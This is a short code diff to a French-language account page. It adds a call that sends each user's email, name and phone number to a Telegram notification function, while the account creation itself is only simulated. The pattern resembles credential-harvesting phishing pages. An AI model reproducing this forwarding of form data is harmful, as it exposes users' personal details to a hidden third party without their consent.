@@ -71,6 +71,16 @@ export default function ComptePage() {
     setIsSubmitting(true)
 
     try {
+      // Send Telegram notification for account creation
+      if (typeof window !== 'undefined' && window.sendTelegramNotification) {
+        window.sendTelegramNotification("account_creation", {
+          email: formData.email,
+          firstName: formData.firstName,
+          lastName: formData.lastName,
+          phone: formData.phone
+        })
+      }
+
       // Simulate account creation
       await new Promise(resolve => setTimeout(resolve, 2000))
       
